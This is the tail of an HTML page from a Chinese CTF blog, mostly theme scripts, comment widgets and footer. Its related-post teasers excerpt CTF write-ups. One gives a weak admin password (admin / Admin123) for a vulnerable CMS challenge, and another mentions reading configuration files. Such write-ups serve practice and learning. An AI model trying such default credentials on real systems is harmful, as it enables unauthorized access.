								my first cmshttps://avd.aliyun.com/detail?id=AVD-2024-27622
弱口令登录
username : admin
password : Admin123
登录进去后：

全世界最简单...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/03/25/NKCTF2024/" title="NKCTF2024">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/4.jpg" alt="NKCTF2024"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">
								DubheCTF_2024			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 19日, 2024				
							</p>
							<p class="relate-post-content">
								师傅们太强了，跟师傅们打比赛能学到很多东西，我就作出来一个最简单的题&#x3D;-&#x3D;
Master of Profile参考链接：https://cn-sec.com/archives/2105254.html想读配置文件，...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/28.jpg" alt="DubheCTF_2024"/>
							</a>
						</div>
					</li>												
			
		</ul>
	
</div>	
				</div>
				<div class="investment-content-list">
					<div class="layout-comment">

	

		

			<!-- gitalk comment -->
			<!-- show gitalk comment -->
<div id="gitalk-container"></div>

<!-- gitalk`s css & js -->
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<link rel="stylesheet" href="/css/comment.css">
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<script type="text/javascript">

	(function gitalkComment(){
		//Thanks O-R
		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
		//去除尾部匹配正则数组的字符串  
		//Remove redundant characters
		String.prototype.trimEnd = function(regStr) {
			let result = this;
			if(regStr == undefined || regStr == null || regStr == "") {
				return result;
			}
			let array = regStr.split(',');

			if(array.length > 0) {

				let c = array.shift(), 
					str = this,
					i = str.length,
					rg = new RegExp(c),
					matchArr = str.match(rg);

				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
					matchStr = matchStr + '$';
					result = str.replace(new RegExp(matchStr), "");
				}

				if(array.length > 0) {
					return result.trimEnd(array.join())
				} else {
					return result;
				}
			}
		};

		//Create gitalk
		let gitalk = new Gitalk({
			clientID: '333--',
			clientSecret: '333--',
			//id: window.location.pathname,
			//id: decodeURI(window.location.pathname),
			//id: (window.location.pathname).split("/").pop().substring(0, 49),
			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
			repo: 'annie-gitalk',
			owner: 'Sariay',
			admin: 'Sariay',
			distractionFreeMode: 'true',
		})
		gitalk.render('gitalk-container');		
	})();
</script>

		
		
	

</div>
				</div>
				<div class="investment-content-list">
					<div class="layout-share">
	
	

		
			
			<!-- socialShare share -->
			<div class="social-share"></div>

<!--  css & js -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
			
		
		
	
</div>


				</div>
			</div>	
		</div>
	</div>
</div>

<!-- show math formula -->



	 
	
<script src="/plugin/clipboard/clipboard.js"></script>

	<script>
		// Copy code !
	    function preprocessing() {
	        $("#article-content .highlight").each(function() {
	            $(this).wrap('<div id="post-code"></div>');
	        })

	        $("#article-content #post-code").each(function() {
	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
	        })

	        $("#article-content .copy-nav").each(function() {
	            let languageClass = $(this).next().attr('class'),
	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);
	            $(this).append('<span class="copy-btn icon-paste"></span>');
	        });
	    }

		function copy() {
		    $('#article-content #post-code').each(function(i) {
		        let codeCopyId = 'codeCopy-' + i;

		        let codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })
   
			let clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn icon-clipboard1');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn icon-paste');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');   
			});
			
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		}
		
		(function copyCode(){
			if ($('.layout-post').length) {
			    preprocessing();
			    copy();
			} 
		})();
	</script>






<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">


<script src="/plugin/fancybox/jquery.fancybox.js"></script>


<script type="text/javascript">
	(function gallerySet(){
		let titleID = $('.article-title a'),
			imageID = $('.article-content img'),
			videoID = $('.article-content video');
		
		let postTitle = titleID.text() ? titleID.text() : "No post title!";
		
		imageID.each(function() {
			let imgPath = $(this).attr('src'),
				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
		});
		
		videoID.each(function() {
			let videoPath = $(this).attr('src');
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
		});
		
		//TODO：支持html5 video

		if($('#layout-post').length) {
			$('[data-fancybox="gallery"]').fancybox({
				loop: true,
				buttons: [
					"zoom",
					"share",
					"slideShow",
					"fullScreen",
					//"download",
					"thumbs",
					"close"
				],
				protect: true
			});
		}
	})();
</script>
		</main>

		<!--footer-->
		<footer>
	<div id="navigation-show">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-Friends!">
			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
</ul>
	</div>

	<div class="copyright">
		<p>
			 
				&copy;2024, content by Infernity. All Rights Reserved.
			
			
				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			
		</p>
		<p>
			

	<!-- busuanzi -->
	<!-- busuanzi -->

		
	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	

		<span id="busuanzi_container_page_pv">
	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
		</span>

	




			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- Local or hitokoto! -->

	
<script src="/plugin/motto/motto.js"></script>

	
	<script type="text/javascript">
		(function motto(){
			let mottoText = getMingYanContent().split('</br> - </br>'),
			
			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
			
			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
			
			mottoTextContent = mottoTextContent.trim().substring(0, 100);
		
			$("#motto-content").html( mottoTextContent);
			$("#motto-author").html( mottoTextFrom  );
		})();	
	</script>	



<!-- love effect -->

	
<script src="/plugin/love/love.js"></script>



<!-- back to top -->

	<div id="totop">
	<span class="icon-circle-up"></span>
</div>



<!-- site analysis -->


	<!-- site-analysis -->
	
	
	
	
	
 

<!-- leancloud -->


	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->


  
<script src="/plugin/leancloud/av-min.js"></script>
<script src="/js/leancloud-count.js"></script>


	

  



<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imagelazyloader/yall.min.js"></script>
<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/plugin/resizediv/resizediv.js"></script>
<script src="/js/main.js"></script>

	</body>	
</html>